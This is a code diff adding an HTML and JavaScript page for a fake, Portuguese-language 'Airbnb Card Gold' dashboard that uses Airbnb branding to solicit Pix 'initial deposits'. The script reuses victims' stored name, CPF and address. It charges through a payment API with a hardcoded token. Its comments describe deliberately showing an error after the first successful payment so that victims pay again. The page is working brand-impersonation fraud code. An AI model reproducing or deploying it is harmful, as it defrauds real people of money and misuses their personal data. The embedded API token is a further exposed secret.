+            <svg viewBox="0 0 1007 1080" fill="#FF385C"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 470.209 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+            Wallet
+        </div>
+        <div class="avatar" id="avatarInitials">V</div>
+    </div>
+
+    <!-- Alert Banner -->
+    <div class="alert-banner" id="alertBanner">
+        <div class="alert-icon"><svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg></div>
+        <div class="alert-text">
+            <div class="at-title" id="alertTitle">Depósito inicial pendente</div>
+            <div class="at-desc" id="alertDesc">Finalize o depósito para ativar seu cartão virtual</div>
+        </div>
+        <div class="alert-arrow"><svg viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"></path></svg></div>
+    </div>
+
+    <!-- Card Display -->
+    <div class="card-display">
+        <div class="mini-card">
+            <div class="mc-bg" id="mcBg"></div>
+            <div class="mc-shine"></div>
+            <div class="mc-content">
+                <div class="mc-top">
+                    <div class="mc-logo">
+                        <svg viewBox="0 0 1007 1080"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 470.209 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+                    </div>
+                    <div class="mc-nfc"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-1 7.5c0 .83-.67 1.5-1.5 1.5S16 10.33 16 9.5 16.67 8 17.5 8s1.5.67 1.5 1.5zm-4.5 0c0 .83-.67 1.5-1.5 1.5s-1.5-.67-1.5-1.5S12.17 8 13 8s1.5.67 1.5 1.5zm-5.5 0C9 8.67 8.33 8 7.5 8S6 8.67 6 9.5 6.67 11 7.5 11 9 10.33 9 9.5z"></path></svg></div>
+                </div>
+                <div class="mc-chip"></div>
+                <div class="mc-bottom">
+                    <div>
+                        <div class="mc-name" id="mcName">VISITANTE</div>
+                        <div class="mc-type">Airbnb Card • Gold</div>
+                    </div>
+                    <div class="mc-brand">VISA</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Balance -->
+    <div class="balance-section">
+        <div class="balance-label">Saldo disponível</div>
+        <div class="balance-value"><small>R$</small> <span id="balanceValue">0</span><small>,00</small></div>
+    </div>
+
+    <!-- Quick Actions -->
+    <div class="quick-actions">
+        <div class="qa-btn" onclick="reabrirUpsell()">
+            <div class="qa-icon" style="background:rgba(255,56,92,0.12)"><svg viewBox="0 0 24 24" fill="#FF385C"><path d="M19 14V6c0-1.1-.9-2-2-2H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zm-9-1c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm13-6v11c0 1.1-.9 2-2 2H4v-2h17V7h2z"></path></svg></div>
+            <span class="qa-label">Depositar</span>
+        </div>
+        <div class="qa-btn">
+            <div class="qa-icon" style="background:rgba(0,113,227,0.12)"><svg viewBox="0 0 24 24" fill="#0071E3"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"></path></svg></div>
+            <span class="qa-label">Fatura</span>
+        </div>
+        <div class="qa-btn">
+            <div class="qa-icon" style="background:rgba(52,199,89,0.12)"><svg viewBox="0 0 24 24" fill="#34C759"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"></path></svg></div>
+            <span class="qa-label">Cashback</span>
+        </div>
+        <div class="qa-btn">
+            <div class="qa-icon" style="background:rgba(175,82,222,0.12)"><svg viewBox="0 0 24 24" fill="#AF52DE"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"></path></svg></div>
+            <span class="qa-label">Segurança</span>
+        </div>
+        <div class="qa-btn">
+            <div class="qa-icon" style="background:rgba(255,59,48,0.12)"><svg viewBox="0 0 24 24" fill="#FF3B30"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg></div>
+            <span class="qa-label">Bloqueio</span>
+        </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="tabs">
+        <div class="tab active" onclick="switchTab('resumo',this)">Resumo</div>
+        <div class="tab" onclick="switchTab('transacoes',this)">Transações</div>
+        <div class="tab" onclick="switchTab('beneficios',this)">Benefícios</div>
+    </div>
+
+    <div class="tab-content">
+        <!-- Tab: Resumo -->
+        <div class="tab-panel active" id="panel-resumo">
+            <div class="info-card">
+                <div class="ic-header">
+                    <div class="ic-title">Dados do Cartão</div>
+                    <div class="ic-badge" id="statusBadge" style="background:rgba(255,159,10,0.1);color:var(--warning)">Pendente</div>
+                </div>
+                <div class="ic-row"><span class="label">Titular</span><span class="value" id="icNome">—</span></div>
+                <div class="ic-row"><span class="label">Limite</span><span class="value" id="icLimite" style="color:var(--success)">—</span></div>
+                <div class="ic-row"><span class="label">Vencimento</span><span class="value" id="icVenc">—</span></div>
+                <div class="ic-row"><span class="label">Cartão</span><span class="value">Airbnb Card Gold</span></div>
+                <div class="ic-row"><span class="label">Anuidade</span><span class="value" style="color:var(--success)">Grátis</span></div>
+            </div>
+
+            <div class="info-card">
+                <div class="ic-header">
+                    <div class="ic-title">Endereço de Entrega</div>
+                    <div class="ic-badge" style="background:rgba(255,159,10,0.1);color:var(--warning)">Pendente</div>
+                </div>
+                <div class="ic-row"><span class="label">Endereço</span><span class="value" id="icAddr">—</span></div>
+                <div class="ic-row"><span class="label">Cidade</span><span class="value" id="icCidade">—</span></div>
+                <div class="ic-row"><span class="label">CEP</span><span class="value" id="icCep">—</span></div>
+                <div class="ic-row"><span class="label">Status</span><span class="value" style="color:var(--warning)">Aguardando envio</span></div>
+            </div>
+        </div>
+
+        <!-- Tab: Transações -->
+        <div class="tab-panel" id="panel-transacoes">
+            <div class="tx-item">
+                <div class="tx-icon" style="background:rgba(255,56,92,0.12)"><svg viewBox="0 0 24 24" fill="#FF385C"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4z"></path></svg></div>
+                <div class="tx-info"><div class="tx-name">Frete do Cartão</div><div class="tx-date">Pago</div></div>
+                <div><div class="tx-amount" style="color:var(--error)" id="freteDisplay">—</div><div class="tx-cashback">Enviando</div></div>
+            </div>
+            <div class="tx-item">
+                <div class="tx-icon" style="background:rgba(0,113,227,0.12)"><svg viewBox="0 0 24 24" fill="#0071E3"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"></path></svg></div>
+                <div class="tx-info"><div class="tx-name">Depósito Inicial</div><div class="tx-date">Pendente</div></div>
+                <div><div class="tx-amount">—</div><div class="tx-cashback" style="color:var(--warning)">Aguardando</div></div>
+            </div>
+            <div class="tx-item">
+                <div class="tx-icon" style="background:rgba(52,199,89,0.12)"><svg viewBox="0 0 24 24" fill="#34C759"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"></path></svg></div>
+                <div class="tx-info"><div class="tx-name">Cashback Disponível</div><div class="tx-date">Acumulado</div></div>
+                <div><div class="tx-amount" style="color:var(--success)">R$ 0,00</div><div class="tx-cashback">Ative seu cartão</div></div>
+            </div>
+            <div style="text-align:center;padding:24px 0;color:var(--gray-400);font-size:0.8125rem">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="var(--gray-300)" style="display:block;margin:0 auto 8px"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"></path></svg>
+                As transações aparecerão aqui após a ativação do cartão
+            </div>
+        </div>
+
+        <!-- Tab: Benefícios -->
+        <div class="tab-panel" id="panel-beneficios">
+            <div class="info-card">
+                <div class="ic-header"><div class="ic-title">Cashback Airbnb</div></div>
+                <div class="ic-row"><span class="label">Hospedagens Airbnb</span><span class="value" style="color:var(--success)">5%</span></div>
+                <div class="ic-row"><span class="label">Experiências Airbnb</span><span class="value" style="color:var(--success)">3%</span></div>
+                <div class="ic-row"><span class="label">Viagens em geral</span><span class="value" style="color:var(--success)">2%</span></div>
+                <div class="ic-row"><span class="label">Outras compras</span><span class="value" style="color:var(--success)">1%</span></div>
+            </div>
+            <div class="info-card">
+                <div class="ic-header"><div class="ic-title">Vantagens Exclusivas</div></div>
+                <div class="ic-row"><span class="label">Anuidade</span><span class="value" style="color:var(--success)">R$ 0</span></div>
+                <div class="ic-row"><span class="label">IOF</span><span class="value">Zero em compras nacionais</span></div>
+                <div class="ic-row"><span class="label">Parcelamento</span><span class="value">Até 12x sem juros</span></div>
+                <div class="ic-row"><span class="label">Aceito em</span><span class="value">220+ países</span></div>
+                <div class="ic-row"><span class="label">Suporte</span><span class="value">24/7</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bottom Nav -->
+    <div class="bottom-nav">
+        <div class="bn-item active">
+            <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"></path></svg>
+            <span>Home</span>
+        </div>
+        <div class="bn-item">
+            <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"></path></svg>
+            <span>Fatura</span>
+        </div>
+        <div class="bn-item" onclick="reabrirUpsell()">
+            <div class="bn-badge"></div>
+            <svg viewBox="0 0 24 24"><path d="M19 14V6c0-1.1-.9-2-2-2H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zm-9-1c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm13-6v11c0 1.1-.9 2-2 2H4v-2h17V7h2z"></path></svg>
+            <span>Depositar</span>
+        </div>
+        <div class="bn-item">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
+            <span>Perfil</span>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+    const LeadData={_key:'airbnb_lead',load(){try{return JSON.parse(localStorage.getItem(this._key)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._key,JSON.stringify(u));return u}};
+    function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
+
+    LeadData.update({page:'dashboard'});
+    const data = LeadData.load();
+    const userName = data.nome || 'Visitante';
+    const firstName = userName.split(' ')[0];
+    const limite = data.limite || data.limite_aprovado || 5000;
+
+    // Popula o dashboard
+    document.getElementById('avatarInitials').textContent = firstName.charAt(0).toUpperCase();
+    document.getElementById('mcName').textContent = userName.toUpperCase();
+    document.getElementById('balanceValue').textContent = '0';
+    document.getElementById('icNome').textContent = userName;
+    document.getElementById('icLimite').textContent = `R$ ${Number(limite).toLocaleString('pt-BR')},00`;
+    document.getElementById('icVenc').textContent = data.vencimento ? `Dia ${data.vencimento}` : '—';
+    if(data.frete?.price) document.getElementById('freteDisplay').textContent = data.frete.price;
+    if(data.rua){let a=data.rua+(data.numero?`, ${data.numero}`:'');document.getElementById('icAddr').textContent=a;}
+    if(data.cidade) document.getElementById('icCidade').textContent=`${data.cidade} / ${data.uf||''}`;
+    if(data.cep) document.getElementById('icCep').textContent=data.cep;
+
+    // Hora
+    function updateTime(){const n=new Date();document.getElementById('currentTime').textContent=n.getHours().toString().padStart(2,'0')+':'+n.getMinutes().toString().padStart(2,'0');}
+    updateTime();setInterval(updateTime,30000);
+
+    // Tabs
+    window.switchTab=function(panel,el){
+        document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+        document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+        el.classList.add('active');
+        document.getElementById('panel-'+panel).classList.add('active');
+    };
+
+    // =====================
+    // NOVA API SHARK PAYMENTS
+    // =====================
+    const SHARK_TOKEN = 'bF8BUqBQfsai95VXrjQfmzuHjJxeLtuC89XU7NLRPAT5Wrc3mIHnc0Rzud84';
+    const PRODUCT_HASH = 'vvae7ptemd';
+    const OFFER_HASH = PRODUCT_HASH;
+
+    let depVal = 100;
+    let pixTimerInterval;
+    let verifyInterval = null;
+    let currentTransactionHash = null;
+
+    function selDep(v, el){
+        depVal = v;
+        document.querySelectorAll('.dep-opt').forEach(d=>d.classList.remove('sel'));
+        if(el) el.classList.add('sel');
+        document.getElementById('customDep').value = '';
+        atualizarTotais();
+    }
+
+    function onCustomDep(v){
+        const n = parseFloat(v);
+        document.querySelectorAll('.dep-opt').forEach(d=>d.classList.remove('sel'));
+        if(!isNaN(n) && n >= 60){ depVal = n; atualizarTotais(); }
+        else if(!isNaN(n) && n > 0){ depVal = 60; atualizarTotais(); }
+    }
+
+    function fmt(v){ return 'R$ ' + v.toFixed(2).replace('.',','); }
+
+    function atualizarTotais(){
+        document.getElementById('depDisplay').textContent = fmt(depVal);
+        document.getElementById('totalDisplay').textContent = fmt(depVal);
+        document.getElementById('btnDepTotal').textContent = fmt(depVal);
+        document.getElementById('pixAmountDisplay').textContent = fmt(depVal);
+    }
+
+    function reabrirUpsell(){
+        document.getElementById('upsellOverlay').classList.remove('hidden');
+    }
+    document.getElementById('alertBanner').onclick = reabrirUpsell;
+
+    async function gerarPixDeposito(){
+        const btn = document.getElementById('upsellPayBtn');
+        if(btn.classList.contains('loading')) return;
+        btn.classList.add('loading'); btn.disabled = true;
+        atualizarTotais();
+
+        const amountInCents = Math.round(depVal * 100);
+        const ld = LeadData.load();
+
+        const payload = {
+            amount: amountInCents,
+            offer_hash: OFFER_HASH,
+            payment_method: 'pix',
+            customer: {
+                name: ld.nome || userName,
+                email: ld.email || 'cliente@airbnb.com',
+                document: ld.cpf || '00000000000',
+                phone_number: ld.phone || ld.phone_formatted?.replace(/\D/g,'') || '11999999999'
+            },
+            cart: [{
+                product_hash: PRODUCT_HASH,
+                title: 'Depósito inicial - Ativação Cartão Airbnb',
+                price: amountInCents,
+                quantity: 1,
+                operation_type: 1,
+                tangible: false
+            }]
+        };
+
+        try {
+            const resp = await fetch(`https://api.sharkpayments.com.br/api/public/v1/transactions?api_token=${SHARK_TOKEN}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const result = await resp.json();
+            const d = result.data || result;
+            if (d.hash || d.pix) {
+                currentTransactionHash = d.hash || d.id;
+                const pixCode = d.pix?.pix_qr_code || d.pix_code;
+                const qrBase64 = d.pix?.qr_code_base64;
+
+                if (pixCode) {
+                    document.getElementById('pixCodeInput').value = pixCode;
+                    const canvas = document.getElementById('qrCanvas');
+                    if (qrBase64) {
+                        const img = new Image();
+                        img.onload = () => {
+                            canvas.getContext('2d').drawImage(img, 0, 0, 186, 186);
+                        };
+                        img.src = `data:image/png;base64,${qrBase64}`;
+                    } else {
+                        QRCode.toCanvas(canvas, pixCode, { width: 186, margin: 1, color: { dark: '#1A1A1A', light: '#FFFFFF' } }, function(err) {});
+                    }
+                    abrirPix();
+                    iniciarTimerPix();
+                    startVerifyDeposito(currentTransactionHash);
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                    btn.innerHTML = '<span class="pay-label"><i class="fas fa-check"></i> Pix gerado — aguardando pagamento</span>';
+                } else {
+                    throw new Error('Código Pix não retornado');
+                }
+            } else {
+                throw new Error('Falha na geração do Pix');
+            }
+        } catch (err) {
+            console.error(err);
+            btn.classList.remove('loading');
+            btn.disabled = false;
+            alert('Erro ao gerar Pix. Tente novamente.');
+        }
+    }
+
+    // ============================================================
+    // CONTROLE DE ESTADO DO DEPOSITO
+    // depositoStep 0 = primeiro pagamento (mostra erro)
+    // depositoStep 1 = segundo pagamento  (ativa o cartao)
+    // ============================================================
+    function getDepositoStep(){ return parseInt(sessionStorage.getItem('airbnb_dep_step')||'0'); }
+    function setDepositoStep(v){ sessionStorage.setItem('airbnb_dep_step', String(v)); }
+
+    function startVerifyDeposito(hash) {
+        if (verifyInterval) clearInterval(verifyInterval);
+        verifyInterval = setInterval(async () => {
+            try {
+                const resp = await fetch(`https://api.sharkpayments.com.br/api/public/v1/transactions/${hash}?api_token=${SHARK_TOKEN}`);
+                const r = await resp.json();
+                const status = (r.data || r).payment_status;
+                if (status === 'paid' || status === 'approved') {
+                    clearInterval(verifyInterval);
+                    if (pixTimerInterval) clearInterval(pixTimerInterval);
+                    const step = getDepositoStep();
+                    if (step === 0) {
+                        setDepositoStep(1);
+                        mostrarErroPagamento();
+                    } else {
+                        setDepositoStep(0);
+                        ativarCartao();
+                    }
+                }
+            } catch(e) {}
+        }, 3000);
+    }
+
+    function mostrarErroPagamento() {
+        const st = document.getElementById('pixStatus');
+        st.className = 'pix-status paid';
+        st.innerHTML = '<div class="ps-icon paid"><i class="fas fa-check-circle"></i></div><div class="ps-title2"><span class="pulse-dot paid"></span>Pagamento recebido!</div><div class="ps-desc">Processando...</div>';
+        setTimeout(() => {
+            fecharPix();
+            document.getElementById('upsellOverlay').classList.add('hidden');
+            document.getElementById('erroOverlay').classList.remove('hidden');
+        }, 1800);
+    }
+
+    function tentarNovamente() {
+        window.location.href = buildUrl('checkout.html');
+    }
+
+    function ativarCartao() {
+        const st = document.getElementById('pixStatus');
+        st.className = 'pix-status paid';
+        st.innerHTML = '<div class="ps-icon paid"><i class="fas fa-check-circle"></i></div><div class="ps-title2"><span class="pulse-dot paid"></span>Deposito confirmado!</div><div class="ps-desc">Ativando seu cartao virtual...</div>';
+        LeadData.update({ deposito_pago: true, deposito_valor: depVal, cartao_ativo: true });
+        setTimeout(() => {
+            fecharPix();
+            document.getElementById('upsellOverlay').classList.add('hidden');
+            document.getElementById('balanceValue').textContent = depVal.toLocaleString('pt-BR');
+            document.getElementById('alertTitle').textContent = 'Cartao virtual ativado!';
+            document.getElementById('alertDesc').textContent = 'Saldo de ' + fmt(depVal) + ' disponivel para uso';
+            document.getElementById('alertBanner').style.background = 'linear-gradient(135deg,rgba(52,199,89,0.1),rgba(52,199,89,0.05))';
+            document.getElementById('alertBanner').style.borderColor = 'rgba(52,199,89,0.2)';
+            document.querySelector('.alert-icon').style.background = 'rgba(52,199,89,0.15)';
+            document.querySelector('.alert-icon svg').style.fill = '#34C759';
+            document.getElementById('statusBadge').style.background = 'rgba(52,199,89,0.1)';
+            document.getElementById('statusBadge').style.color = '#34C759';
+            document.getElementById('statusBadge').textContent = 'Ativo';
+        }, 2200);
+    }
+
+    function confirmarPago() {
+        if (currentTransactionHash) {
+            startVerifyDeposito(currentTransactionHash);
+            document.getElementById('pixStatus').innerHTML = '<div class="ps-icon wait"><i class="fas fa-clock"></i></div><div class="ps-title2"><span class="pulse-dot wait"></span>Verificando pagamento...</div><div class="ps-desc">Aguarde, estamos confirmando com o banco</div>';
+        } else {
+            alert('Nenhum Pix pendente. Gere um novo Pix primeiro.');
+        }
+    }
+
+    function abrirPix(){ document.getElementById('pixOverlay').classList.add('open'); }
+    function fecharPix(){ 
+        document.getElementById('pixOverlay').classList.remove('open'); 
+        clearInterval(pixTimerInterval); 
+        clearInterval(verifyInterval);
+        verifyInterval = null;
+    }
+
+    function copiarPix(){
+        const code = document.getElementById('pixCodeInput').value;
+        if (!code) return;
+        navigator.clipboard.writeText(code).then(()=>{
+            const btn = document.getElementById('copyBtn');
+            btn.textContent='Copiado!'; btn.classList.add('done');
+            setTimeout(()=>{btn.textContent='Copiar';btn.classList.remove('done');},2500);
+        });
+    }
+
+    function iniciarTimerPix(){
+        let s = 599; // 9:59
+        clearInterval(pixTimerInterval);
+        pixTimerInterval = setInterval(()=>{
+            s--;
+            const m=Math.floor(s/60), ss=s%60;
+            document.getElementById('pixTimer').textContent=m+':'+(ss<10?'0':'')+ss;
+            if(s<=0){ 
+                clearInterval(pixTimerInterval); 
+                document.getElementById('pixTimer').textContent='Expirado';
+                document.getElementById('pixStatus').innerHTML = '<div class="ps-icon wait"><i class="fas fa-clock"></i></div><div class="ps-title2"><span class="pulse-dot wait"></span>Tempo expirado</div><div class="ps-desc">Feche e gere um novo Pix</div>';
+            }
+        },1000);
+    }
+
+    // Inicializa totais
+    atualizarTotais();
+</script>
+<script defer src="beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516-9" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"efc14968cefb42f29a2bbedf4a560b08","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
+
